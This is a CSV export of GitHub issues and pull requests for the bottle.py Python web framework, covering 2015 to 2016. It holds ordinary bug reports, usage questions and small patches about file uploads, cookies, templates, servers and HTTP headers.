ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
855,FileUpload.filename cut off multi-byte characters (only extension is left),2016-06-06T09:26:08Z,,Request,,,"I'm just trying update my product's bottle.py 0.11 to 0.12; and found objects in `Request.files` changed to new class `FileUpload` from `cgi.FieldStorage`.

They are not compatibile and have difference with `filename`:
- filename of `cgi.FieldStorage` returns client-side file name
- [filename of `FileUpload`](master/bottle.py#L2572) returns SAFE-FILE-NAME for saving which cut off non-ASCII and path separator 

Those changes make hardly problem in multi-byte culture.
If user upload file with non-ASCII named file, we got **only extension** of filename with `FileUpload.filename`.

For example: 
`あいうえお.txt`
 v  cut off non-ascii
`.txt`
 v  strip '.'
`txt`

We can also use raw_filename insteadly, but
1. need to care 'raw' or 'not' of filename for simply display filename of user uploaded is nonsense.
2. `filename` of non-ASCII named become meaningless and less safe for name uniqueness.

For problem 1:
Renaming `raw_filename`/`filename` to `filename`/`safe_filename` is most best solution, I think.
Most of non-expert user use `save` method. Or use 'safe_' prefixed for saving. Thus security affect of this changes would be minimal.

FYI, as for my product, files are managed with sequence number. Filenames are stored on DB for user can identify them. so no need to make filename safe.

For problem 2:
Apply percent or some other escaping instead of cut off, is suboptimal to continuing current way.
This may also solve part of problem 1, escaped strings is a enough hint to use `raw_filename`.

Anyway, cutting off is bad idea and hope fix this.
Naming file with only Japanese characters is very neutral for ordinaly people in Japan. Might be same in Chinese or other non-ASCII countries.

thanks

seems related:
https://github.com/bottlepy/bottle/issues/582
"
854,Can't set cookies when returning redirect,2016-06-03T17:08:49Z,2016-06-03T17:14:19Z,,,,"With latest bottle.py version it seems that `set_cookie` doesn't work when used with `return redirect`. With older versions it worked fine. Now I'll need to return short web page which contains HTML refresh to get cookies set and then redirect the user to appropriate URL.
"
853,Add support for TLS,2016-05-31T06:10:42Z,,,,,"It would be nice to have support for TLS for more secure connections. At least for the WSGIRef server this should be quite easily possible to accomplish by using ssl.wrap_socket().
"
852,Files with Certain Unicode Characters Don't Upload,2016-05-24T16:00:10Z,2016-06-20T07:43:02Z,,,,"Client Code

```
>>> r = requests.post(""http://server/upload"", files={""file"": (u'\u0412\u0430\u043b\u044e\u0442\u043d\u043e\u0435\u0437\u0430\u043a\u043e\u
043d\u043e\u0434\u0430\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e.\u0420\u0438\u0441\u043a\u0438\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u043a\u0438\
u0442\u0430\u043c\u043e\u0436\u0435\u043d\u043d\u043e\u0439\u0441\u0442\u043e\u0438\u043c\u043e\u0441\u0442\u0438.doc', file_bytes)})
```

Server Code

```
@route(""/upload"", method='POST')
def upload():
    if request.files.file != """":
        data = request.files.file
    else:
        data = None

    if data is None:
        abort(400, ""No file provided"")

    return {""status"": ""success""}
```

Result:

```
>>> r.status_code
400
>>> r.text
'...No file provided..'
```
"
851,What exactly is a SomeAsyncWorker,2016-05-13T09:12:59Z,2016-05-24T04:07:11Z,,,,"Stumbled upon this [SO question](http://stackoverflow.com/questions/20824218/how-to-implement-someasyncworker-from-bottle-asynchronous-primer)

In the page [Primer to Asynchronous Applications - EVENT CALLBACKS](http://bottlepy.org/docs/dev/async.html?highlight=worker#event-callbacks), it says 

```
In order to conform to the WSGI standard, all we have to do is to return a body iterable that we can write to asynchronously
...
```

``` @route('/fetch')
def fetch():
    body = gevent.queue.Queue()
    worker = SomeAsyncWorker()
    worker.on_data(body.put)
    worker.on_finish(lambda: body.put(StopIteration))
    worker.start()
    return body
```

How does one create a `SomeAsyncWorker`? What exactly is this?
"
850,"using generators, setting content-type prevent data being transferred immediately",2016-05-08T21:04:55Z,2016-05-09T16:13:51Z,,,,"From the sample code [here](http://bottlepy.org/docs/dev/async.html#greenlets-to-the-rescue), if we add Content-Type header all data is transferred after 8 seconds.

```
from gevent import monkey; monkey.patch_all()

from time import sleep
from bottle import route, run, response

@route('/stream')
def stream():
    response.set_header('Content-Type', 'text/plain')   # <- here the change
    yield 'START'
    sleep(3)
    yield 'MIDDLE'
    sleep(5)
    yield 'END'

run(host='0.0.0.0', port=8080, debug=True, server='gevent')
```
"
849,STPL failure in the presence of escaped \% end followed by % end,2016-05-06T22:42:08Z,2016-05-07T10:06:13Z,,,,"The STPL processing seems to fail if there is a line with just `\% end` immediately followed by a line with just `% end`.

The following script shows up the error:

```
from bottle import SimpleTemplate

# In the following source, there is a ""% end"" immediately following an
# escaped line containing just ""\% end"". which causes a problem
SOURCE1 = '''<input type=""{{ type }}"" name=""{{ name }}""
% if type != 'password':
\% if form.get('{{ name }}'):
 value=""{{ '{{' }} form['{{ name }}'] }}""
\% end
% end
/>'''

# In the following source, the two lines containing ""\% end"" and ""% end"" are
# separated by a blank line, which leads to better behaviour, except that
# the blank line is swallowed.
SOURCE2 = '''<input type=""{{ type }}"" name=""{{ name }}""
% if type != 'password':
\% if form.get('{{ name }}'):
 value=""{{ '{{' }} form['{{ name }}'] }}""
\% end

% end
/>'''

DATA = {
    'username': 'foo',
    'password': 'bar',
}

for source_name in 'SOURCE1', 'SOURCE2':
    source = globals()[source_name]
    print('%s:' % source_name)
    t1 = SimpleTemplate(source).render(type='text', name='username', form=DATA)
    print(t1)
    print('-' * 72)
    t2 = SimpleTemplate(source).render(type='password', name='password', form=DATA)
    print(t2)
    print('=' * 72)
```

When run, the above script produces

```
SOURCE1:
<input type=""text"" name=""username""
% if form.get('username'):
value=""{{ form['username'] }}""
% end
 end
/>
------------------------------------------------------------------------
<input type=""password"" name=""password""

========================================================================
SOURCE2:
<input type=""text"" name=""username""
% if form.get('username'):
value=""{{ form['username'] }}""
% end
/>
------------------------------------------------------------------------
<input type=""password"" name=""password""
/>
========================================================================
```

This is with Bottle v0.12.9, Python 3.4.3, on Linux.
"
848,How to use HTML,2016-04-28T14:55:14Z,2016-05-03T03:21:30Z,,,,"I have developed a blog program,but i don't know how to use html weight.like CheckBox,select,radiobox and so on,Can you give me a example?
"
847,POST forms type=float error,2016-04-14T22:27:58Z,2016-04-16T00:20:43Z,,TypeError,TypeError: float() argument must be a string or a number,"what is wrong get compra as float?

route(""/new"", method=""POST"")
def new_item():
    """"""
    Add a new item
    """"""
    descripcion = request.forms.get('descripcion')
    compra = request.forms.get('compra', type=float)
    venta = request.forms.get('venta')
    pesos = request.forms.get('pesos')
    proveedor = request.forms.get('proveedor')
    stock = request.forms.get('stock')

```
pevendedor = float(compra)*1.15
publico = float(compra)*1.27
```

Traceback (most recent call last):
  File ""/Library/Python/2.7/site-packages/bottle.py"", line 862, in _handle
    return route.call(*_args)
  File ""/Library/Python/2.7/site-packages/bottle.py"", line 1732, in wrapper
    rv = callback(_a, *_ka)
  File ""/Users/hoguera/Documents/Bottle/bottle/Genesis/inicio_viejo.py"", line 76, in new_item
    pevendedor = float(compra)_1.15
TypeError: float() argument must be a string or a number
"
846,Update changelog.rst indentation,2016-04-06T21:34:28Z,2016-05-03T18:25:11Z,,,,"Cleaned up the spacing so that it properly renders
"
845,Bottle app running on Paste or CherryPy or any other server cannot handle chunked input,2016-04-05T18:00:52Z,,Bug,,,"I am trying to run this curl command:
curl -H'Transfer-Encoding: chunked' -F'audio=@bar.wav' -F'text={""key"": ""value""}' -F'image=@foo.jpg' localhost:8085/upload

against this application:

---

import paste
from bottle import Bottle, route, error, post, get, response, request, template
app = Bottle()
@app.post('/upload')
def upload():
    print ""Files: "", request.files['image'].filename, ""|"", request.files['audio'].filename
    print ""Forms: "", request.forms['text']
    print ""Content-Length: "", request.headers['Content-Length']
    print ""Content-Type: "", request.headers['Content-Type']
    print ""Contents of File ["", request.files['image'].name, ""]: "", request.files['image'].file.readlines()
    print ""Contents of File ["", request.files['audio'].name, ""]: "", request.files['audio'].file.readlines()  
    return {""message"": ""OK""}

---

When I use the internal wsgiref server in Bottle to run this code as:
       app.run(host='localhost', port=8085, reloader=True)
the files upload OK and the output gets printed but if I use the third-part server ('paste' for example) as
       app.run(server='paste', host='localhost', port=8085, reloader=True)
then I get an error saying ""Error while parsing chunked transfer body.""

What am I doing wrong?

Thanks,
Amit
"
844,Not Support Expect:100-continue (HTTP/1.1),2016-04-03T04:37:26Z,,,,,"libcurl will send http/1.1 head  `Expect:100-continue`  by default. this will cause a 2 second wait for any huge data post requset.

```
version  0.13-dev,python 2.6.6

usage:
$python -m bottle test_module
```
"
843,Order of operations for route filters and route selection not documented,2016-04-01T16:57:32Z,,,,,"Basically, due to how routes are compiled down to a regex and then appended to a list, you can sometimes manage to mask other routes by mistake. Consider the following routes:
1. `/app/dashboard`
2. `/app/<app:path>`
3. `/app/config/<who>`

How does it work in practice? (At least as far as I've seen)
- `/app/dashboard` will work, as it is a static route, and therefore checked before regexes.
- `/app/notepad/mynotes` will resolve to `/app/<app:path>` as expected.
- `/app/config/me` will **NOT** resolve to `/app/config/<who>`, but instead to `/app/<app:path>`, as that regex is checked before `/app/config/<who>`, and matches.

I'd recommend either documenting in the routing docs that order of route definition matters, or sort routes based on the constant length, in other words, how many characters there is before a wildcard shows up.
"
842,Inherit template's syntax while rendering sub-templates,2016-03-31T23:00:15Z,2016-05-03T18:25:37Z,,,,"Otherwise the custom syntax will not apply to ""include""-d templates
"
841,Explicitly flush wsgi.errors after writing errors,2016-03-29T17:09:25Z,2016-10-19T10:59:24Z,,,,"uwsgi is impolite and supplies a block-buffered object for wsgi.errors.  The result is that exception traces get lost or severely delayed.

Please consider adding a call to environ['wsgi.errors'].flush() after all the writes to wsgi.errors to force the errors out to the log.
"
840,fix invalid badge links,2016-03-27T08:58:52Z,2016-05-03T18:26:10Z,,,,"change badge links from https://pypip.in/ to https://img.shields.io/pypi/
"
839,Fail to retrieve Content-Length from the HTTP response header,2016-03-01T09:57:47Z,,,ValueError,ValueError: invalid literal for int() with base 10: '',"I'm using bottle v0.12.9. For my web app I need to retrieve the Content-Length value. I tried both
approaches:
i) response.get_header('Content-Length') -> returned None
ii) response.content_length -> returned empty string ''

Error msg for the latter:

File ""/Library/Python/2.7/site-packages/bottle.py"", line 1416, in **get**
    return self.reader(value) if self.reader else value
ValueError: invalid literal for int() with base 10: ''

Thanks.
"
838,Add PyPI classifier for Py 3.4 and 3.5,2016-02-27T08:34:50Z,2016-02-27T11:25:15Z,,,,"fixes #837
"
837,about Python3.5,2016-02-25T10:11:41Z,2016-02-27T11:25:15Z,,,,"I found bottlepy is not work when I update to Python3.5,can you tell me how to deal with?
"
836,Python 3.4.3 & Bottle with CGI - environ['REQUEST_METHOD'] issue,2016-02-24T17:31:50Z,,,KeyError,KeyError: 'REQUEST_METHOD',"I am trying to use Python 3.4.3 and Bottle 0.12.8 to run a simple webservice using cgi. I am running the below script from my Linux system. I was able to run the the same service without CGI. 

---

import bottle
from bottle import route, run, request, response

host = 'XXXX'
port = '8080'
debug = 'False'

@route('/hello/',  method=['OPTIONS','GET'])
def hello():
    return(""Success"")

bottle.run(host=host, port=port,debug=debug,server='cgi')
# bottle.run(host=host, port=port,debug=debug)

---

I get the below error, when I run the service with CGI- 

Traceback (most recent call last):
  File ""/usr/local/lib/python3.4/site-packages/bottle.py"", line 858, in _handle
    route, args = self.router.match(environ)
  File ""/usr/local/lib/python3.4/site-packages/bottle.py"", line 413, in match
    verb = environ['REQUEST_METHOD'].upper()
KeyError: 'REQUEST_METHOD'
<h1>Critical error while processing request: </h1><h2>Error:</h2>

<pre>
KeyError(&#039;REQUEST_METHOD&#039;,)
</pre>

<h2>Traceback:</h2>

<pre>
Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.4/site-packages/bottle.py&quot;, line 957, in wsgi
    or environ[&#039;REQUEST_METHOD&#039;] == &#039;HEAD&#039;:
KeyError: &#039;REQUEST_METHOD&#039;

</pre>

Status: 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=UTF-8
Content-Length: 374

<h1>Critical error while processing request: </h1><h2>Error:</h2>

<pre>
KeyError(&#039;REQUEST_METHOD&#039;,)
</pre>

<h2>Traceback:</h2>

<pre>
Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.4/site-packages/bottle.py&quot;, line 957, in wsgi
    or environ[&#039;REQUEST_METHOD&#039;] == &#039;HEAD&#039;:
KeyError: &#039;REQUEST_METHOD&#039;

</pre>

---

Am I doing something wrong here or is it a bug or non-compatibility between python and bottle version. Any pointers would help.
Thanks,
"
835,Fix spelling,2016-02-17T18:18:16Z,2016-02-17T18:20:43Z,,,,
834,Fix typo in doc code snippet,2016-02-13T15:06:44Z,2016-05-03T18:26:58Z,,,,
833,WaitressServer: pass self.options to serve method,2016-02-12T15:48:32Z,2016-05-03T18:27:12Z,,,,
832,Fix coding style,2016-02-12T14:37:23Z,2016-02-12T15:28:19Z,,,,"```
This patch will close #823
```
"
831,"WaitressServer, pass self.options to serve",2016-02-12T13:21:59Z,2016-02-12T15:33:08Z,,,,"pass all options to the WaitressServer adapter, this will allow to set the number of treads via bottle.run
"
830,Mixin args into kwargs earlier in template(),2016-02-06T09:54:05Z,2016-02-12T10:11:52Z,,,,"In short: `@view('some_template', template_lookup='./app/my_vews')` won't work

I want to add a lookup-path for templates in my app, so I hook `view` and add `temlate_lookup` to kwargs but it doesn't work.

``` python
from . import bottle
from .bottle import route, request, response

from . import config

view = functools.partial(bottle.view, template_lookup=[config.PATH + '/pages'])
```

This patch fix the problem by mixin args earlier.
"
829,Bottle incorrectly sets Content-Length header when status is 204,2016-02-05T23:26:42Z,2016-02-12T15:15:18Z,,,,"Per [RFC 7230 3.3.2 p31](https://tools.ietf.org/html/rfc7230#section-3.3.2):

> A server MUST NOT send a `Content-Length` header field in any response with a status code of `1xx (Informational)` or `204 (No Content)`.

Unfortunately, Bottle does send the `Content-Length` header.

Minimal code example:

```
@delete('/foo')
def delete_foo():
    response.status = 204
    return response
```

Curl:
`curl 'http://localhost:8080/foo' -X DELETE -vvv`

Response:

```
HTTP/1.1 204 No Content
Content-Length: 0
Date: Fri, 05 Feb 2016 23:22:43 GMT
Server: myserver
```
"
828,Typo in test_app doc,2016-02-05T15:41:57Z,2016-02-12T09:52:25Z,,,,
827,Is bottle.py ok for production?,2016-01-29T17:32:59Z,2016-02-12T15:16:09Z,,,,"Is bottle.py ok for production?
"
826,"waitress, pass all options",2016-01-29T06:44:52Z,2016-07-26T10:32:52Z,,,,"the current implementation of the waitress adapter only passes self.host and self.port as an argument to serve(). but waitress accepts some more options, like ""threads"" would it make sense to call serve like this?

```
serve(handler, host=self.host, port=self.port, **self.options)
```
"
825,Plugin execution order,2016-01-22T14:29:48Z,2016-01-22T20:34:43Z,,,,"It would appear that global plugins are not called in an expected order.

For example;

``` python
bottle.install(DatabasePlugin())
bottle.install(PluginThatNeedsDatabase())
```

The above would first call `PluginThatNeedsDatabase()`and then `DatabasePlugin()`. 

This goes against the advice seen in [documentation](http://bottle.readthedocs.org/en/latest/tutorial.html#application-wide-installation);

> The order of installed plugins is significant, though. If a plugin requires a database connection, you need to install the database plugin first.

As you can see from our example though, the database plugin cannot be installed first, otherwise dependant plugins will not work correctly.

You can see a full demonstration of this in action [here](http://blog.bilak.info/2015/07/05/bottle-plugin-lifecycle/).

I would argue that the execution order of app plugins and view plugins should be the same, but as you can see from this [line](https://github.com/bottlepy/bottle/blob/master/bottle.py#L595), this is not the case. There are also backwards compatibility concerns with such a fix, given that it will almost certainly break every app in existence with plugin dependancies.

Thoughts @defnull ?
"
824,Request.set_cookie(httponly=False) still sets the httponly flag.,2016-01-20T18:08:08Z,2016-02-12T15:24:29Z,Bug,,,"This is actually a bug in the stdlib Morsel implementation, which only checks if the key is present and ignores its value. Same goes for the 'secure' flag.
"
823,Extra semi-colon,2016-01-19T17:21:01Z,2016-02-12T15:25:07Z,,,,"There is a semi-colon at the end of a one-line statement inside `Bottle._handle`:

```
return out;
```

This is not a bug or any big deal, but can be confusing at the first sight. 
If necessary, I can fix this and send a PR. 
"
822,Fixing initial copyright year,2016-01-18T11:10:55Z,2016-02-09T17:00:55Z,,,,"According to http://www.copyright.gov/circs/circ01.pdf , document should list its first year of publication in its copyright

As the license was applied back in 2011 ( As per the commit - 4047cda0ab5aaa ), therefore creating a range from 2011-2016
"
821,Import module hashlib and change default hashing algorithm of HMAC from MD5 to SHA256,2016-01-14T01:26:39Z,2016-02-12T09:53:10Z,,,,"By default, Python's HMAC algorithm uses MD5 (see https://docs.python.org/2/library/hmac.html) which is deemed as cryptographically broken and unsuitable for further use. This change makes SHA256 the default and also allows users to select the hashing function being used a runtime.
"
820,Unable to set charset property (as presented in the official tutorial),2016-01-13T16:00:59Z,,,,,"Hello (again)

The official tutorial explain that we can set the charset of the response like that 

``` python
response.charset = 'ISO-8859-15'
```

However in the code, charset is just a read only property. I don't know if it was also a writable property in the past but If you want I can make a PR either by removing this from the doc, or making this property writable. 
What do you think?
"
819,Response's charset ignored when returning a dictionary (as json),2016-01-13T15:56:22Z,2016-02-12T15:27:34Z,,,,"Hello,
First of all thanks a lot for the great tool, it's the best and the simplest lib to create API with python.

I saw that when returning a dict, it is automatically converted to json and the content-type header is automatically set to `application/json`.
That's nice but in this case the charset is ignored. Usually, we want the content-type to be `application/json; charset=utf-8`
(the charset can be different for those who explicitly set another charset before returning the dict, but now there is no way to set the charset in the response when returning a dict.

I think this happens at line 1960 (in bottle.py master):

``` python
    if isinstance(rv, dict):
        #Attempt to serialize, raises exception on failure
        json_response = dumps(rv)
        #Set content type only if serialization successful
        response.content_type = 'application/json'
        return json_response
```

Maybe we can have something like this instead:

``` python
    response.content_type = 'application/json; charset=' + response.charset
```

what do you think?
"
818,Fix spacing in Recipe doc,2016-01-13T01:23:27Z,2016-01-17T04:40:15Z,,,,"This is a small, silly change. The spacing was 8 spaces in rather than 4.
"
817,Bottle and Interactive shell,2016-01-04T10:16:31Z,,,,,"Is it possible to create a python file that starts Bottle but then opens an interactive shell within the browser so that I can open up a pre built python script?

Basically I have a fully functional python script that I wish to access via a web browser on my local network. It feels like I can use Bottle to achieve this?
"
816,Catching redirect exception which is raised in before_request hook,2015-12-30T15:34:14Z,2016-01-10T21:03:04Z,,,,"Catching redirect exception which is raised in before_request hook. 

This an attempt to fix issue #815 
"
815,redirecting in befoe_request hook is not working as before,2015-12-30T15:21:22Z,,,,,"Redirecting to a new URL is done via raising a HTTPResponse exception in Bottle. I think after https://github.com/bottlepy/bottle/commit/d85a6983ceedacd9ab9afbcd027139d8773b67ac this commit, this exception is not catched in Bottle._handle() method if redirecting is made in a before_request hook. 
"
814,ResourceWarning unclosed <socket.socket>,2015-12-26T16:02:55Z,,,,,"Hi,

When quitting a Bottle app using ^C and the built-in webserver, I get this message in the console:

```
/bottle.py:3119: ResourceWarning: unclosed <socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8080)>
```

Then, it hangs, and I have to ^C a second times to exit.

It should not be a big deal, but I never saw it before. Is it due to some recent changes? Thanks!
"
813,Remove 2.5 and 3.1 things,2015-12-21T11:24:49Z,2016-01-10T21:03:45Z,,,,"Removing unecessary 2.5 test dependencies
Delete some 2.5 and 3.1 things
"
812,remove py25 on tox file,2015-12-13T20:00:48Z,2015-12-13T21:28:56Z,,,,
811,Fix charset for application/javascript files,2015-12-12T21:32:10Z,2015-12-13T16:12:55Z,,,,
810,Fixed Jinja2 File Templates unusable since e456b4f,2015-12-12T17:08:59Z,2015-12-13T16:12:46Z,,,,"This patch re-establish the possibility to use jinja2 templates.

Example, without it:

```
$ cat views/hello.tpl 
Hi!
```

```
$ cat hello.py 
from bottle import jinja2_template

print(jinja2_template('hello'))
```

```
$ python hello.py
[...]
    ""Refer to templates with names or paths relative to the lookup path."")
DeprecationWarning: Warning: Use of deprecated feature or API. (Deprecated in Bottle-0.12)
Cause: Use of absolute path for template name.
Fix: Refer to templates with names or paths relative to the lookup path.
```

The bug is also visible with ""test_jinja2""
"
809,Implemented namespace support for merge,2015-12-08T23:23:05Z,2015-12-13T16:15:27Z,,,,
808,Fix to enable async based wsgi server to support yield and yield from in endpoints,2015-12-08T18:30:39Z,2016-02-12T11:21:53Z,,,,"The code in _cast that checks for the content type of iterable interferes with async based wsgi servers where the async endpoints are generators that yield or yield from while waiting for io.

``` python

# Handle Iterables. We peek into them to detect their inner type.
        try:
            iout = iter(out)
            first = next(iout)
            while not first:  # this interferes with async driven endpoints
                first = next(out)
```

Change to

``` python

# Handle Iterables. We peek into them to detect their inner type.
        try:
            iout = iter(out)
            first = next(iout)

```

The problem is that this code greedily consumes the iterable until there is non empty content. But it does not need to. An empty unicode string or an empty bytes will still suffice to determine the type.  There may be a use case for an iterable to return an empty string of a different type than what the non empty will be but that seems counter intuitive. The other cases where the itterable returns and HTTPResponse object I don't know about.

Type check still works in the event of an empty string but allows an endpoint to yield an empty string while its async waiting for async io to complete.

For example

``` python
@app.get('/register/<uid>')
def registerGet(uid):
        """"""
        Example of async endpoint
        """"""
       # must set content-type before first yield
        bottle.response.set_header('content-type', 'application/json')

        response = yield from myAsyncCoroutine()  # yields """" while not yet completed
        result = json.dumps(response)
        (yield result)

def myAsyncCoroutine():
     while True:
        # Async io here
        if done:
             break
        yield ''  # this is eventually yielded by wsgi app while waiting
     return response
```

I believe this is still compatible with PEP 3333 (see below)as start response has to keep iterating until it gets a
non empty return. This allows the WSGI server to drive the async endpoint coroutine by repeatedly calling the iterater. This allows very simple execution of async wsgi apps. The bottle.run is no longer necessary.

For example the following service routine is repeatedly called by an async scheduler running the the
wsgi http server:

``` python

def service(self):
        """"""
        Service application
        """"""
        if not self.closed and not self.ended:
            if self.iterator is None:  # initiate application
                self.iterator = iter(self.app(self.environ, self.start))

            try:
                msg = next(self.iterator)
            except StopIteration:
                self.write(b"""")  # if chunked write will send empty chunk to terminate
                self.ended = True
            else:
                if msg:
                    self.write(msg)
                    if self.length is not None and self.size >= self.length:
                        self.ended = True
```

where self.app in this case is a bottle app

With the changes I am able to get my async http server to support yield and yield from in the bottle endpoints where they yield empty strings while waiting for async io operations to complete before returning the response from the endpoint.

From PEP 3333
""However, the start_response callable must not actually transmit the response headers. Instead, it must store them for the server or gateway to transmit only after the first iteration of the application return value that yields a non-empty bytestring, or upon the application's first invocation of the write() callable. In other words, response headers must not be sent until there is actual body data available, or until the application's returned iterable is exhausted. (The only possible exception to this rule is if the response headers explicitly include a Content-Length of zero.)""
"
807,set_cookie inside a plugin for mounted applications,2015-12-01T10:58:43Z,,,,,"I have develop a plugin for manage session with mongodb and my project has few applications that I mount in the main module.

In main module I install the plugin and on every app I mount I set skip=()

The plug-in works good on every application, but the response.set_cookie inside the plugin does not affect to applications controllers. It only works in routes that are in the main module.

I have been trying different things for days but I can not get it work.

Please, could anybody help me?
"
806,Handle JSON requests with a vendor media type,2015-11-14T17:19:51Z,2016-02-12T10:34:54Z,"Needs input, Request, Undecided",,,"e.g. application/vnd.api+json
"
805,Add make command for running tests on py35,2015-11-14T17:11:27Z,2015-11-14T19:41:36Z,,,,
804,"added 'apps' as alias to app, defer 'default app' creation until requ…",2015-11-05T22:59:48Z,2016-02-12T10:07:17Z,,,,"…ired and add 'default' property to appstack

see https://groups.google.com/forum/#!topic/bottlepy/iMjGmPfJ0tE

This is very minor, tested, and has been discussed on the google group.  Hope all are happy for this.
I have more significant suggestions that can follow.
"
803,Typo fix on bottle-werkzeug README,2015-11-04T13:19:17Z,2016-02-12T09:57:15Z,,,,"the document of `bottle-werkzeug` is a little confused.
"
802,We must save the file first as a static-file before download it in bottle?,2015-11-04T08:57:05Z,2015-11-05T03:56:57Z,,,,"i've notice the manual:

```
@route('/download/<filename:path>')
def download(filename):
    return static_file(filename, root='/path/to/static/files', download=filename)
```

what can i do to put it into the response's stream without save it.
"
801,parent death signal with reloader=True,2015-10-29T16:45:52Z,,,,,"I have a bottle project where the process loads a lot of data. With reloader=True, typing ^C on the bottle process means the memory-heavy child remains alive. And it's holding the port open.

In Linux, this is easy to deal with by using a parent death signal:

```
libc = ctypes.CDLL(""libc.so.6"")
# PR_SET_PDEATHSIG = 1
libc.prctl(1, signal.SIGTERM)
```

That's not very pretty code, sorry, but I think that this would be a good default behavior under Linux.
"
800,adding new features?,2015-10-25T23:18:41Z,,,,,"We are using bottle for a few projects,  and would love to add some new features.

The focus would be to ensure nothing breaks back compatibility and existing apps would run with the new features.

I have a fork, and can make suggested changes to that fork, so that it is possible features could be adopted by the bottle project.  Of course, this depends on how open the bottle project is to new ideas.  Perhaps the idea is to freeze features?   Or there is already a major revision in the works so the timing is bad?

How open is bottle to new features?  What is the best way to have debate on ideas?
"
799,Request.msgpack property,2015-10-20T16:36:14Z,2016-08-27T15:14:13Z,,,,"Hi, I'm working with Bottle and a MsgPack API and I want to share my implementation of MsgPack bodyparser.
"
798,Request.msgpack property,2015-10-20T15:59:33Z,2015-10-20T16:09:03Z,,,,"Hi, I'm working with Bottle and a MsgPack API and I want to share my implementation of MsgPack bodyparser.
"
797,Merge pull request #2 from defnull/master,2015-10-20T13:58:40Z,2015-10-20T14:02:36Z,,,,"Update from original
"
796,Fix minor error in getargspec,2015-10-11T17:55:23Z,2015-10-11T18:19:45Z,,,,"A followup to #794.

From the documentation:

> defaults is a tuple of default argument values or None if there are no default arguments

so `return (args, varargs, keywords, tuple(defaults) or defaults)` should be `return (args, varargs, keywords, tuple(defaults) or None)`.

Sorry for this.
"
795,Fix cookie tests in test_environ.TestResponse,2015-10-11T10:39:43Z,2015-10-11T17:08:07Z,,,,"This is a solution for #791.

A few tests are failing because of [some recent changes](http://bugs.python.org/issue23250) in `http.cookies`:
- `test_set_cookie_secure`
- `test_set_cookie_httponly`

`test_delete_cookie` fails too, I'm not entirely sure why. The workaround is to check for containment of `'Max-Age=-1'`.

Also, I added Python 3.5 to `.travis.yml`.
"
794,cannot import name 'getargspec' in Python 3.6(-dev),2015-10-11T07:23:32Z,2015-10-11T17:11:52Z,,ImportError,ImportError: cannot import name 'getargspec',"[`inspect.getargspec`](https://docs.python.org/3/library/inspect.html#inspect.getargspec) has been removed

> Deprecated since version 3.0: Use signature() and Signature Object, which provide a better introspecting API for callables. This function will be removed in Python 3.6.

bottle.py fails with the following error:

```
Traceback (most recent call last):
  File ""<file>"", line 77, in <module>
    from inspect import getargspec
ImportError: cannot import name 'getargspec'
```
"
793,Unable to mount to path containing variable,2015-10-09T22:30:41Z,,,TypeError,TypeError: mountpoint_wrapper() takes no arguments (1 given),"I'd like to mount an app to a path containing a variable. For example, if I mounted `app` to `/lol/<x>`, I'd like all callbacks sent to `app.get` to receive an argument `x`. I tried:

``` python
import bottle

app = bottle.Bottle()
bottle.mount('/lol/<x>', app)

@app.get('/')
def index(x):
    return x

bottle.run()
```

which unfortunately produced:

```
Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/site-packages/bottle.py"", line 862, in _handle
    return route.call(**args)
TypeError: mountpoint_wrapper() takes no arguments (1 given)
```

This is actually a common requirement, e.g. in mounting a `user` app to `/users/<user_id>` to handle API endpoints pertaining to a specific user. Is this possible?
"
